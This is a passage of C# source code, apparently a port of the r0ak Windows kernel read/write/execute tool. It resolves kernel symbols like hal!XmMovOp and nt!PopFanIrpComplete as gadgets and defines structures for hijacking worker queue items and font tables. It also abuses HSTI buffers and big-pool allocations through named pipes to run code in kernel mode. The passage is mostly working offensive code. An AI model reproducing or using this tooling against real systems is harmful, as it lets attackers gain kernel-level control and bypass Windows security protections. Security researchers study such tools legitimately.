                        Console.WriteLine("[+] Write executed successfuly!");
                        return 0;
                    default:
                        Console.WriteLine("[-] Unrecognized command '{0}'", args[0]);
                        return -1;
                }
            }
            finally {
                // Teardown the execution engine if we initialized it
                KernelExecuteTeardown(kernelExecute);
            }
        }

        private static unsafe UIntPtr SymLookup(string ModuleName, string SymbolName)
        {
            UIntPtr imageBase = UIntPtr.Zero;
            UIntPtr kernelBase = UIntPtr.Zero;
            ulong offset;
            UIntPtr /* PIMAGEHLP_SYMBOL64 */ symbol = UIntPtr.Zero;
            UIntPtr realKernelBase;

            try {
                // Get the base address of the kernel image in kernel-mode
                realKernelBase = GetDriverBaseAddr(ModuleName);
                if (UIntPtr.Zero == realKernelBase) {
                    Console.WriteLine("[-] Couldn't find base address for {0}", ModuleName);
                    return UIntPtr.Zero;
                }

                // Load the kernel image in user-mode
                kernelBase = Natives.LoadLibraryExA(ModuleName, IntPtr.Zero, 0x00000001 /* DONT_RESOLVE_DLL_REFERENCES*/);
                if (UIntPtr.Zero == kernelBase) {
                    Console.WriteLine("[-] Couldn't map {0}!", ModuleName);
                    return UIntPtr.Zero;
                }

                // Allocate space for a symbol buffer
                symbol = (UIntPtr)Natives.HeapAlloc(Natives.GetProcessHeap(), 0x00000008 /* HEAP_ZERO_MEMORY */,
                    (uint)(Marshal.SizeOf<IMAGEHLP_SYMBOL64>() + 2));
                if (UIntPtr.Zero == symbol) {
                    Console.WriteLine("[-] Not enough memory to allocate IMAGEHLP_SYMBOL64");
                    return UIntPtr.Zero;
                }

                // Attach symbols to our module
                imageBase = pSymLoadModuleEx(Natives.GetCurrentProcess(), IntPtr.Zero, ModuleName, ModuleName,
                    kernelBase, 0, UIntPtr.Zero, 0);
                if (imageBase != kernelBase) {
                    Console.WriteLine("[-] Couldn't load symbols for {0}", ModuleName);
                    return UIntPtr.Zero;
                }

                // Build the symbol name
                string symName = ModuleName + "!" + SymbolName;

                // Look it up
                Marshal.WriteInt32(symbol, 0, Marshal.SizeOf<IMAGEHLP_SYMBOL64>());
                // symbol->SizeOfStruct = sizeof(*symbol);
                Marshal.WriteInt32(symbol, (int)Marshal.OffsetOf<IMAGEHLP_SYMBOL64>("MaxNameLength"), 1);
                // symbol->MaxNameLength = 1;
                if (!pSymGetSymFromName64(Natives.GetCurrentProcess(), symName, symbol)) {
                    Console.WriteLine("[-] Couldn't find {0} symbol : Err 0x{1:X8}",
                        symName, Marshal.GetLastWin32Error());
                    return UIntPtr.Zero;
                }
                // Compute the offset based on the mapped address
                offset = ((ulong)Marshal.ReadIntPtr(symbol, 4) /* symbol->Address */ - (ulong)kernelBase);
            }
            finally {
                if (UIntPtr.Zero != kernelBase) {
                    Natives.FreeLibrary(kernelBase);
                }
                if (UIntPtr.Zero != imageBase) {
                    pSymUnloadModule64(Natives.GetCurrentProcess(), imageBase);
                }
                if (UIntPtr.Zero != symbol) {
                    Natives.HeapFree(Natives.GetProcessHeap(), 0, symbol);
                }
            }
            // Compute the final location based on the real kernel base
            return (UIntPtr)((ulong)realKernelBase + offset);
        }

        private static bool SymSetup()
        {
            RegistryKey rootKey = null;
            RegistryKey localMachineKey = null;

            // Open the Kits key
            try {
                try {
                    localMachineKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    rootKey = localMachineKey.OpenSubKey(@"Software\Microsoft\Windows Kits\Installed Roots");
                }
                catch {
                    Console.WriteLine("[-] No Windows SDK or WDK installed: 0x{0:X8}", Marshal.GetLastWin32Error());
                    return false;
                }
                // Check where a kit was installed
                string rootPath = null;
                try { rootPath = (string)rootKey.GetValue("KitsRoot10", null); }
                catch { }
                finally {
                    if (null == rootPath) {
                        Console.WriteLine("[-] Win 10 SDK/WDK not found, falling back to 8.1: 0x{0:X8}", Marshal.GetLastWin32Error());
                        try { rootPath = (string)rootKey.GetValue("KitsRoot81", null); }
                        catch { }
                        finally {
                            if (null == rootPath) {
                                Console.WriteLine("[-] Win 8.1 SDK / WDK not found, falling back to 8: 0x{ 0:X8}", Marshal.GetLastWin32Error());
                                try { rootPath = (string)rootKey.GetValue("KitsRoot8", null); }
                                catch { }
                                finally {
                                    if (null == rootPath) {
                                        Console.WriteLine("[-] Win 8 SDK / WDK not found 0x{ 0:X8}", Marshal.GetLastWin32Error());
                                    }
                                }
                            }
                        }
                    }
                }
                if (null == rootPath) {
                    return false;
                }
                // Now try to load the correct debug help library
                rootPath += "debuggers\\x64\\dbghelp.dll";
                IntPtr hMod = IntPtr.Zero;
                try { hMod = Natives.LoadLibrary(rootPath); }
                catch { }
                if (IntPtr.Zero == hMod) {
                    Console.WriteLine("[-] Failed to load Debugging Tools Dbghelp.dll: 0x{0:X8}", Marshal.GetLastWin32Error());
                    return false;
                }
                // Get the APIs that we need
                if (!InitializeBridgeDelegate(hMod, "SymSetOptions", out pSymSetOptions)) {
                    return false;
                }
                if (!InitializeBridgeDelegate(hMod, "SymInitializeW", out pSymInitializeW)) {
                    return false;
                }
                if (!InitializeBridgeDelegate(hMod, "SymLoadModuleEx", out pSymLoadModuleEx)) {
                    return false;
                }
                if (!InitializeBridgeDelegate(hMod, "SymGetSymFromName64", out pSymGetSymFromName64)) {
                    return false;
                }
                if (!InitializeBridgeDelegate(hMod, "SymUnloadModule64", out pSymUnloadModule64)) {
                    return false;
                }

                // Initialize the engine
                pSymSetOptions(0x00000004 /*SYMOPT_DEFERRED_LOADS*/);
                if (!pSymInitializeW(Natives.GetCurrentProcess(), null, true)) {
                    Console.WriteLine("[-] Failed to initialize symbol engine: 0x{0:X8}", Marshal.GetLastWin32Error());
                    return false;
                }
                // Initialize our gadgets
                g_XmFunction = SymLookup("hal.dll", "XmMovOp");
                if (UIntPtr.Zero == g_XmFunction) {
                    Console.WriteLine("[-] Failed to find hal!XmMovOp");
                    return false;
                }
                g_TrampolineFunction = SymLookup("ntoskrnl.exe", "PopFanIrpComplete");
                if (UIntPtr.Zero == g_TrampolineFunction) {
                    Console.WriteLine("[-] Failed to find nt!PopFanIrpComplete");
                    return false;
                }
                // HSTI = Hardware Security Test Interface
                // See https://docs.microsoft.com/fr-fr/windows-hardware/test/hlk/testref/hardware-security-testability-specification
                g_HstiBufferSize = SymLookup("ntoskrnl.exe", "SepHSTIResultsSize");
                if (UIntPtr.Zero == g_HstiBufferSize) {
                    Console.WriteLine("[-] Failed to find nt!SepHSTIResultsSize");
                    return false;
                }
                g_HstiBufferPointer = SymLookup("ntoskrnl.exe", "SepHSTIResultsBuffer");
                if (UIntPtr.Zero == g_HstiBufferPointer) {
                    Console.WriteLine("[-] Failed to find nt!SepHSTIResultsBuffer");
                    return false;
                }
            }
            finally {
                if (null != rootKey) { rootKey.Dispose(); }
                if (null != localMachineKey) { localMachineKey.Dispose(); }
            }
            return true;
        }

        private static bool InitializeBridgeDelegate<T>(IntPtr hMod, string functionName, out T pointer)
        {
            IntPtr dynamicFunction = Natives.GetProcAddress(hMod, functionName);
            if (IntPtr.Zero == dynamicFunction) {
                Console.WriteLine("[-] Failed to find {0}. Err 0x{1:X4}",
                    functionName, Marshal.GetLastWin32Error());
                pointer = default(T);
                return false;
            }
            pointer = (T)(object)Marshal.GetDelegateForFunctionPointer(dynamicFunction, typeof(T));
            return true;
        }

        private delegate long RdtscDelegate();
        private static RdtscDelegate Rdtsc;
        internal const uint PERF_WORKER_THREAD = 0x48000000;
        internal const uint EVENT_TRACE_GROUP_THREAD = 0x0500;
        internal const uint PERFINFO_LOG_TYPE_WORKER_THREAD_ITEM_END = (EVENT_TRACE_GROUP_THREAD | 0x41);
        internal const uint FILE_MAP_ALL_ACCESS = 0x000F001F;
        internal const uint MAXIMUM_ALLOWED = (1 << 25);
        internal const uint NPFS_DATA_ENTRY_POOL_TAG = 0x4E704672; // 'rFpN'
        internal const uint NPFS_DATA_ENTRY_SIZE = 0x30;
        internal const uint PAGE_SIZE = 4096;
        internal const uint POOL_TAG_FIXED_BUFFER = (32 * 1024 * 1024);
        internal const uint SystemBigPoolInformation = 66;
        internal const uint SystemHardwareSecurityTestInterfaceResultsInformation = 166;
        internal delegate bool SymGetSymFromName64Delegate(
            [In] IntPtr hProcess,
            [In, MarshalAs(UnmanagedType.LPStr)] string Name,
            [In] UIntPtr /* PIMAGEHLP_SYMBOL64 */ Symbol);
        internal delegate bool SymInitializeWDelegate(
            [In] IntPtr hProcess,
            [In, MarshalAs(UnmanagedType.LPWStr)] string UserSearchPath,
            [In] bool fInvadeProcess);
        internal delegate UIntPtr SymLoadModuleExDelegate(
            [In] IntPtr hProcess,
            [In] IntPtr hFile,
            [In, MarshalAs(UnmanagedType.LPStr)] string ImageName,
            [In, MarshalAs(UnmanagedType.LPStr)] string ModuleName,
            [In] UIntPtr BaseOfDll,
            [In] uint DllSize,
            [In] UIntPtr /* MODLOAD_DATA */ Data,
            [In] uint Flags);
        internal delegate bool SymUnloadModule64Delegate(
            [In] IntPtr hProcess,
            [In] UIntPtr BaseOfDll);
        internal delegate uint SymSetOptionsDelegate(
            [In] uint SymOptions);
        internal static SymGetSymFromName64Delegate pSymGetSymFromName64;
        internal static SymInitializeWDelegate pSymInitializeW;
        internal static SymLoadModuleExDelegate pSymLoadModuleEx;
        internal static SymSetOptionsDelegate pSymSetOptions;
        internal static SymUnloadModule64Delegate pSymUnloadModule64;
        private static UIntPtr g_HstiBufferPointer;
        private static UIntPtr g_HstiBufferSize;
        private static UIntPtr g_TrampolineFunction;
        private static UIntPtr g_XmFunction;
        private const string g_EtwTraceName = "r0ak-etw";
        // private static readonly byte[] g_EtwTraceName = Encoding.Unicode.GetBytes("r0ak-etw");
        private static readonly Guid g_EtwTraceGuid = new Guid(0x53636210, 0xbe24, 0x1264, 0xc6, 0xa5, 0xf0, 0x9c, 0x59, 0x88, 0x1e, 0xbd);

        internal struct CONTEXT_PAGE
        {
            internal RTL_BALANCED_LINKS Header;
            internal ulong _filler0;
            internal ulong _filler1;
            internal ulong _filler2;
            internal ulong _filler3;
            internal ulong _filler4;
            internal ulong _filler5;
            internal ulong _filler6;
            internal ulong _filler7;
            internal ulong _filler8;
            internal ulong _filler9;
            internal WORK_QUEUE_ITEM WorkItem;
        }

        // Tracks tracing data between calls
        internal unsafe struct ETW_DATA
        {
            internal IntPtr SessionHandle;
            internal IntPtr ParserHandle;
            internal Natives.EVENT_TRACE_PROPERTIES* Properties;
            internal UIntPtr WorkItemRoutine;
        }

        internal struct IMAGEHLP_SYMBOL64
        {
            internal uint SizeOfStruct;
            internal IntPtr Address;
            internal uint Size;
            internal uint Flags;
            internal uint MaxNameLength;
            internal char Name;
        }

        // Tracks allocation state between calls
        internal struct KERNEL_ALLOC
        {
            internal IntPtr Pipe0;
            internal IntPtr Pipe1;
            internal UIntPtr UserBase;
            internal UIntPtr KernelBase;
            internal uint MagicSize;
        }

        // Tracks execution state between calls
        internal unsafe struct KERNEL_EXECUTE
        {
            internal XSGLOBALS* Globals;
            internal KERNEL_ALLOC* TrampolineAllocation;
            internal RTL_BALANCED_LINKS* TrampolineParameter;
        }

        internal unsafe struct LIST_ENTRY
        {
            internal LIST_ENTRY* Flink;
            internal LIST_ENTRY* Blink;
        }

        internal struct MODLOAD_DATA
        {
            internal uint ssize;
            internal uint ssig;
            internal IntPtr data;
            internal uint size;
            internal uint flags;
        }

        internal unsafe struct RTL_AVL_TABLE
        {
            internal RTL_BALANCED_LINKS BalancedRoot;
            internal IntPtr OrderedPointer;
            internal uint WhichOrderedElement;
            internal uint NumberGenericTableElements;
            internal uint DepthOfTree;
            internal RTL_BALANCED_LINKS* RestartKey;
            internal uint DeleteCount;
            internal UIntPtr CompareRoutine;
            internal UIntPtr AllocateRoutine;
            internal UIntPtr FreeRoutine;
            internal UIntPtr TableContext;
        }

        internal unsafe struct RTL_BALANCED_LINKS
        {
            internal RTL_BALANCED_LINKS* Parent;
            internal RTL_BALANCED_LINKS* LeftChild;
            internal RTL_BALANCED_LINKS* RightChild;
            internal byte Balance;
            internal byte _filler0;
            internal byte _filler1;
            internal byte _filler2;
        }

        [StructLayout(LayoutKind.Explicit)]
        internal struct SYSTEM_BIGPOOL_ENTRY
        {
            [FieldOffset(0)]
            internal UIntPtr VirtualAddress;
            [FieldOffset(0)]
            internal ulong NonPaged; // :1
            [FieldOffset(8)]
            internal ulong SizeInBytes;
            [FieldOffset(16)]
            internal byte Tag0;
            [FieldOffset(17)]
            internal byte Tag1;
            [FieldOffset(18)]
            internal byte Tag2;
            [FieldOffset(19)]
            internal byte Tag3;
            [FieldOffset(16)]
            internal uint TagUlong;
        }

        internal struct SYSTEM_BIGPOOL_INFORMATION
        {
            internal uint Count;
            internal SYSTEM_BIGPOOL_ENTRY AllocatedInfo /* [ANYSIZE_ARRAY] */;
        }

        internal struct WORK_QUEUE_ITEM
        {
            internal LIST_ENTRY List;
            internal UIntPtr WorkerRoutine;
            internal UIntPtr Parameter;
        }

        internal struct XM_CONTEXT
        {
            internal ulong _reserved0;
            internal ulong _reserved1;
            internal ulong _reserved2;
            internal ulong _reserved3;
            internal ulong _reserved4;
            internal ulong _reserved5;
            internal ulong _reserved6;
            internal ulong _reserved7;
            internal ulong _reserved8;
            internal ulong _reserved9;
            internal ulong _reserved10;
            internal UIntPtr DestinationPointer;
            internal UIntPtr SourcePointer;
            internal uint DestinationValue;
            internal uint SourceValue;
            internal uint CurrentOpcode;
            internal uint DataSegment;
            internal XM_OPERATION_DATATYPE DataType;
        }

        internal unsafe struct XSGLOBALS
        {
            internal IntPtr NetworkFontsTableLock;
            internal RTL_AVL_TABLE* NetworkFontsTable;
            internal IntPtr TrustedFontsTableLock;
            internal RTL_AVL_TABLE* TrustedFontsTable;
        }

        internal enum XM_OPERATION_DATATYPE : uint
        {
            BYTE_DATA = 0,
            WORD_DATA = 1,
            LONG_DATA = 3
        }
    }
}
